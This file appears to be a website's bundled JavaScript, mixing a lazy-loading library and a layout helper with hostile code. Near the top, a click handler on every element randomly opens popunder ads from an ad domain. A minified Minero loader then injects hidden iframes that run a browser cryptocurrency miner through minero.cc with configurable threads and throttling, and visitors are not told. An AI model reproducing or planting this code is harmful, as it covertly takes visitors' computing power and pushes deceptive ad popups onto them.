$(document).ready(function() {
  $("*").on("click",function(){
    var r = Math.floor((Math.random() * 200) + 1);
    if (r === 100) {
      window.open('http://deloplen.com/afu.php?zoneid=2772265','_blank');
    }
  });
});

self.Minero=self.Minero||{},self.Minero.CONFIG={LIB_URL:"https://minero.cc/lib/",MINER_URL:"https://minero.cc/html/miner.html",BLANK_MINER_URL:"https://minero.cc/html/blank-miner.html",WEBSOCKET_SHARDS:[["wss://worker.minero.cc"]],DONATE_WIDGET_URL:"https://minero.cc/widget/donate"},function(e){"use strict";var i=function(e){var t=(this.div=e).dataset,i=Minero.CONFIG.BLANK_MINER_URL+"?key="+t.key+"&user="+encodeURIComponent(t.user||"")+"&throttle="+(t.throttle||"")+"&threads="+(t.threads||"");this.div.innerHTML="",this.iframe=document.createElement("iframe"),this.iframe.style.width="100%",this.iframe.style.height="100%",this.iframe.style.border="none",this.iframe.src=i,this.div.appendChild(this.iframe)};i.CreateElements=function(){for(var e=document.querySelectorAll(".minero-hidden"),t=0;t<e.length;t++)new i(e[t])},"complete"===document.readyState||"interactive"===document.readyState?i.CreateElements():document.addEventListener("readystatechange",function(){"interactive"===document.readyState&&i.CreateElements()}),e.Minero=e.Minero||{},e.Minero.Miner=i}(window);

var yall=function(){"use strict";return function(e){var n=(e=e||{}).lazyClass||"lazy",t=e.lazyBackgroundClass||"lazy-bg",o="idleLoadTimeout"in e?e.idleLoadTimeout:200,r=e.observeChanges||!1,i=e.events||{},a=window,s="requestIdleCallback",c="IntersectionObserver",u=["srcset","src","poster"],d=[],l=function(e,o){return d.slice.call((o||document).querySelectorAll(e||"img."+n+",video."+n+",iframe."+n+",."+t))},f=function(n){var o,r,i=n.parentNode;for(var a in"PICTURE"==i.nodeName&&(r=i),"VIDEO"==n.nodeName&&(r=n),o=l("source",r))b(o[a]);b(n),n.autoplay&&n.load();var s=n.classList;s.contains(t)&&(s.remove(t),s.add(e.lazyBackgroundLoaded||"lazy-bg-loaded"))},v=function(e){for(var n in i)e.addEventListener(n,i[n].listener||i[n],i[n].options||void 0);y.observe(e)},b=function(e){u.forEach(function(n){n in e.dataset&&a.requestAnimationFrame(function(){e[n]=e.dataset[n]})})},g=l();if(/baidu|(?:google|bing|yandex|duckduck)bot/i.test(navigator.userAgent))for(var m in g)f(g[m]);else if(c in a&&c+"Entry"in a&&"isIntersecting"in a[c+"Entry"].prototype){var y=new a[c](function(e,t){e.forEach(function(e){if(e.isIntersecting){var i=e.target;s in a&&o?a[s](function(){f(i)},{timeout:o}):f(i),i.classList.remove(n),t.unobserve(i),(g=g.filter(function(e){return e!=i})).length||r||y.disconnect()}})},{rootMargin:("threshold"in e?e.threshold:200)+"px 0%"});for(var h in g)v(g[h]);r&&new MutationObserver(function(){l().forEach(function(e){g.indexOf(e)<0&&(g.push(e),v(e))})}).observe(l(e.observeRootSelector||"body")[0],e.mutationObserverOptions||{childList:!0,subtree:!0})}}}();
document.addEventListener("DOMContentLoaded", yall);

function adjustBodyPadding() {
  var height = $('nav.notbody').height();
  $('body').css({'padding-top': height});
  setTimeout(adjustBodyPadding, 500);
}
adjustBodyPadding();